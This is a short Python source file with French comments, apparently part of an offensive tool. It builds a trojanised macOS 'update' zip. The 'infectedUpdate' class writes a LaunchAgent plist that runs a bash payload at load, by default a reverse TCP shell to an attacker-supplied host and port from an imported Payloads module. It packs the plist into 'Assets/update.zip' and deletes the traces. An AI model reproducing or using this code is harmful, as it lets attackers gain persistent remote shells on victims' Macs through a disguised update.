from pathlib import Path
from zipfile import ZipFile
import Payloads


# Retourne le fichier zip contenant le fichier plist
class infectedUpdate:
    def __init__(self, _name, _host, _port, _payload=None):
        self._name = _name
        if not _payload:
            self._payload = Payloads.REVERSE_TCP_SHELL.format(_host, _port) # A l'avenir nous pourrions imaginer plus de payloads disponibles
        else:
            self._payload = _payload
        self.payload = f"""<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n\n<plist version="1.0">\n\n<dict>\n\n    <key>Label</key>\n\n    <string>{self._name}</string>\n\n    <key>ProgramArguments</key>\n\n    <array>\n\n        <string>bash</string>\n\n        <string>-c</string>\n\n        <string>{self._payload}</string>\n\n    </array>\n\n    <key>RunAtLoad</key>\n\n    <true/>\n\n</dict>\n\n</plist>"""
        self.getZip()

    # Création du fichier zip
    def getZip(self): 
        tmpFolder = Path('./LaunchAgents')
        if not Path.exists(tmpFolder) or not Path.is_dir(tmpFolder):
            Path.mkdir(tmpFolder)
        plist = Path(tmpFolder / f'{self._name}.plist')
        with open(plist, 'w') as f:
            f.write(self.payload)
        update = ZipFile(Path(__file__).parent / 'Assets' / 'update.zip', 'w')
        update.write(plist)
        plist.unlink()
        tmpFolder.rmdir()
